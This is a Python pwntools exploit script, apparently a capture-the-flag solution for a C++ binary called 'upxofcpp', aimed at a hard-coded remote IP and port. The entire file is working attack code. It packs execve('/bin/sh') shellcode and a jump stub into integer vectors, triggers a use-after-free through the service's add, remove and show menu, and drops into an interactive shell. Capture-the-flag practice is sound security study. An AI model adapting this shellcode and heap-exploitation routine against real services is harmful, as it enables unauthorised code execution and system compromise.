from pwn import *

#r = process('./upxofcpp')
#r = process('./unpacked_upxofcpp')
r = remote('34.92.121.149', 10000)

def add_vec(index, size, ints):
	if len(ints) < size and -1 not in ints:
		ints.append(-1)
	print ints
	r.sendafter('Your choice:', '1\n')
	r.sendafter('Index:', str(index) + '\n')
	r.sendafter('Size:', str(size) + '\n')
	r.recvuntil('stop:')
	for i in ints:
		r.send(str(i) + '\n')

def remove_vec(index):
	r.sendafter('Your choice:', '2\n')
	r.sendafter('vec index:', str(index) + '\n')

def show_vec(index):
	r.sendafter('Your choice:', '4\n')
	r.sendafter('vec index:', str(index) + '\n')

shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

shellcode_ints = []
jmp_to_shellcode_shellcode_ints = []

if len(shellcode) % 4:
	shellcode += '\x90'*(4 -(len(shellcode) % 4))

for i in range(0, len(shellcode), 4):
	j = u32(shellcode[i:i+4])
	if j > 0x80000000:
		j = -(0x100000000 - j)
	shellcode_ints.append(j)

jmp_to_shellcode_shellcode = '\x48\x8D\x40\x38\xFF\xE0'

if len(jmp_to_shellcode_shellcode) % 4:
	jmp_to_shellcode_shellcode += '\x90'*(4 -(len(jmp_to_shellcode_shellcode) % 4))

for i in range(0, len(jmp_to_shellcode_shellcode), 4):
	j = u32(jmp_to_shellcode_shellcode[i:i+4])
	if j > 0x80000000:
		j = -(0x100000000 - j)
	jmp_to_shellcode_shellcode_ints.append(j)

add_vec(0, 0x28/4, [0,0,0,0,0,0,0,0] + jmp_to_shellcode_shellcode_ints)
add_vec(1, 0x28/4, [0,0] + shellcode_ints)
add_vec(2, 0x28/4, [])
remove_vec(1)
remove_vec(0)
remove_vec(2)
show_vec(2)

'''
remove_vec(1)
remove_vec(0)
add_vec(3, 0x30/4, shellcode_ints)
remove_vec(2)
'''

r.interactive()
